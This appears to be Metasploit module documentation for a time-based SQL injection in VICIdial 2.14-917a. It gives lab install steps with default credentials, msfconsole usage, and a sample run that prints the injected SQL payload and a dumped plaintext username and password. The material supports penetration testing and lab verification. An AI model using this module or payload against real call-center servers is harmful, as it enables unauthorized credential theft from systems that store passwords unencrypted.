## Vulnerable Application

This module exploits a single authenticated SQL Injection vulnerability in VICIdial, affecting version 2.14-917a.

VICIdial does not encrypt passwords by default.

VICIBox/VICIdial includes an auto-update mechanism, so be aware for creating vulnerable boxes.

### Install

#### 9.0.3 & 10.0.0

1. Install the following OpenSUSE 10 ISO
- [ViciBox_v9.x86_64-9.0.3.iso](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9.x86_64-9.0.3.iso)
or
- [ViciBox_v10.x86_64-10.0.0.iso](http://download.vicidial.com/iso/vicibox/server/archive/ViciBox_v10.x86_64-10.0.0.iso) :
    1. Change the default password (`root`:`vicidial`)
    2. Set Timezone, Keyboard Layout, ok the license, and Language
    3. Network settings should autoconfigure (Tested on VMware Fusion). Network settings can be configured with the
        command `yast lan` if necessary
2. Run `vicibox-express` to initiate the ViciDial Express Installation, everything can be kept as default
3. Navigate to `http://<ip-address>/`
    1. Click `Administration` and login with default credentials username: `6666`, password: `1234`
    2. Once logged in, Click `Continue on to the Initial Setup`. Everything can be kept as default. 
4. The complete list of setup instructions can be found by following this
[link](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9-install.pdf)


## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/scanner/http/vicidial_sql_enum_users_pass`
1. Do: `set RHOSTS <ip>`
1. Do: `set RPORT <port>`
1. Do: `set TARGETURI <path>`
1. Do: `set COUNT <number>`
1. Do: `set SqliDelay <number>`
1. Do: `run`
1. The module will exploit the SQL injection and return the extracted usernames and passwords

## Options

### COUNT

Number of records to dump. Defaults to 1.

### SqliDelay

Delay in seconds for SQL Injection sleep. Defaults to 1.

## Scenarios

### ViciBox 9.0.3

```
msf6 auxiliary(scanner/http/vicidial_sql_enum_users_pass) > run https://192.168.1.100
[*] Running module against 192.168.1.100

[*] Checking if target is vulnerable...
[+] Target is vulnerable to SQL injection.
[*] {SQLi} Executing (select group_concat(aR) from (select cast(concat_ws(';',ifnull(User,''),ifnull(Pass,'')) as binary) aR from vicidial_users limit 1) juBM)
[*] {SQLi} Encoded to (select group_concat(aR) from (select cast(concat_ws(0x3b,ifnull(User,repeat(0x5b,0)),ifnull(Pass,repeat(0x7d,0))) as binary) aR from vicidial_users limit 1) juBM)
[*] {SQLi} Time-based injection: expecting output of length 16
[+] Dumped table contents:
vicidial_users
==============

    User  Pass
    ----  ----
    6666  aLLah4465

[*] Auxiliary module execution completed
```
